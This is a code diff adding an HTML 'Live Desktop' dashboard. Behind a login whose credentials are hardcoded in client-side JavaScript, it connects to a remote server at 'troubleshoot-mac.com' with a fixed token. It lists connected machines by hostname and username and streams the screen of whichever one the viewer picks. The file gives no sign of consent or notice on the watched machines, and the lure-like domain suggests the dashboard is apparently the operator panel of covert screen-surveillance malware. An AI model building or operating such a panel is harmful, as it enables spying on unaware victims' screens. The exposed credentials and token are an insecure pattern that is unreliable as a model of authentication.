@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Desktop - Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-container h1 {
+            color: #333;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 28px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            color: #555;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+        .error-message.show { display: block; }
+        .dashboard-container {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            background: #1a1a1a;
+            color: white;
+            flex-direction: column;
+        }
+        .dashboard-container.active { display: flex; }
+        .dashboard-header {
+            background: #2d2d2d;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #667eea;
+        }
+        .status-indicator {
+            padding: 10px 20px;
+            background: #2d2d2d;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #e74c3c;
+            display: inline-block;
+        }
+        .status-dot.connected { background: #2ecc71; }
+        #clientsContainer {
+            padding: 20px;
+            background: #2d2d2d;
+            border-bottom: 2px solid #667eea;
+            display: none;
+        }
+        #clientsContainer.show { display: block; }
+        #clientsList {
+            margin: 15px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .client-btn {
+            width: 100%;
+            padding: 12px;
+            background: #3d3d3d;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: left;
+            transition: background 0.3s;
+            font-size: 14px;
+        }
+        .client-btn:hover {
+            background: #4d4d4d;
+        }
+        .client-btn.selected {
+            background: #667eea;
+        }
+        .screen-container {
+            flex: 1;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #000;
+            position: relative;
+            overflow: hidden;
+        }
+        #screenStream {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        #waitingMessage {
+            color: #999;
+            font-size: 18px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginScreen">
+        <h1>🔐 Live Desktop</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit" class="btn">Enter Dashboard</button>
+            <div class="error-message" id="errorMessage">Invalid credentials.</div>
+        </form>
+    </div>
+    <div class="dashboard-container" id="dashboardScreen">
+        <div class="dashboard-header">
+            <h1>📺 Live Desktop Dashboard</h1>
+            <div class="status-indicator">
+                <span class="status-dot" id="statusDot"></span>
+                <span id="statusText">Connecting...</span>
+            </div>
+        </div>
+        <div id="clientsContainer">
+            <h2 style="color: white; margin-bottom: 15px;">Active Clients</h2>
+            <div id="clientsList"></div>
+            <button id="refreshBtn" class="btn" style="margin-top: 10px;">🔄 Refresh Clients</button>
+        </div>
+        <div class="screen-container">
+            <div id="waitingMessage">Waiting for screen stream... Select a client from the list above.</div>
+            <img id="screenStream" style="display: none;" alt="Screen Stream">
+        </div>
+    </div>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        const CORRECT_USERNAME = 'm33';
+        const CORRECT_PASSWORD = 'bigplug81@';
+        const REMOTE_SERVER = 'https://troubleshoot-mac.com/';
+        const loginScreen = document.getElementById('loginScreen');
+        const dashboardScreen = document.getElementById('dashboardScreen');
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const screenStream = document.getElementById('screenStream');
+        const statusDot = document.getElementById('statusDot');
+        const statusText = document.getElementById('statusText');
+        const waitingMessage = document.getElementById('waitingMessage');
+        const clientsContainer = document.getElementById('clientsContainer');
+        let socket = null;
+        let selectedClientId = null;
+        
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
+                loginScreen.style.display = 'none';
+                dashboardScreen.classList.add('active');
+                connectToServer();
+            } else {
+                errorMessage.classList.add('show');
+                setTimeout(() => errorMessage.classList.remove('show'), 3000);
+            }
+        });
+        
+        function connectToServer() {
+            socket = io(REMOTE_SERVER, {
+                transports: ['websocket', 'polling'],
+                upgrade: true,
+                rememberUpgrade: true
+            });
+            
+            socket.on('connect', () => {
+                statusText.textContent = 'Connected';
+                statusDot.classList.add('connected');
+                // Request list of available clients
+                socket.emit('get-clients', { token: '9f1013f0' });
+            });
+            
+            socket.on('clients-list', (clients) => {
+                if (clients && clients.length > 0) {
+                    clientsContainer.classList.add('show');
+                    updateClientsList(clients);
+                } else {
+                    waitingMessage.textContent = 'No clients available. Waiting for clients to connect...';
+                    clientsContainer.classList.remove('show');
+                }
+            });
+            
+            socket.on('screen-frame', (data) => {
+                if (data.clientId === selectedClientId) {
+                    waitingMessage.style.display = 'none';
+                    screenStream.src = data.image;
+                    screenStream.style.display = 'block';
+                    statusText.textContent = 'Streaming';
+                }
+            });
+            
+            socket.on('disconnect', () => {
+                statusText.textContent = 'Disconnected';
+                statusDot.classList.remove('connected');
+            });
+            
+            socket.on('connect_error', () => {
+                statusText.textContent = 'Connection Error';
+                statusDot.classList.remove('connected');
+            });
+            
+            document.getElementById('refreshBtn').addEventListener('click', () => {
+                socket.emit('get-clients', { token: '9f1013f0' });
+            });
+        }
+        
+        function updateClientsList(clients) {
+            const list = document.getElementById('clientsList');
+            list.innerHTML = '';
+            
+            if (clients.length === 0) {
+                list.innerHTML = '<p style="color: #999; text-align: center;">No clients connected</p>';
+                return;
+            }
+            
+            clients.forEach(client => {
+                const btn = document.createElement('button');
+                btn.className = 'client-btn';
+                btn.textContent = `pc-${client.hostname}-${client.username} (${client.resolution || '1920x1080'})`;
+                btn.onclick = () => {
+                    selectedClientId = client.id;
+                    document.querySelectorAll('.client-btn').forEach(b => b.classList.remove('selected'));
+                    btn.classList.add('selected');
+                    socket.emit('watch-client', { 
+                        token: '9f1013f0', 
+                        clientId: client.id
+                    });
+                    statusText.textContent = 'Connecting to ' + client.hostname;
+                    screenStream.style.display = 'none';
+                    waitingMessage.textContent = 'Connecting to ' + client.hostname + '...';
+                    waitingMessage.style.display = 'block';
+                };
+                list.appendChild(btn);
+            });
+        }
+        
+        // Auto-refresh clients list every 3 seconds to detect new clients
+        setInterval(() => {
+            if (socket && socket.connected) {
+                socket.emit('get-clients', { token: '9f1013f0' });
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
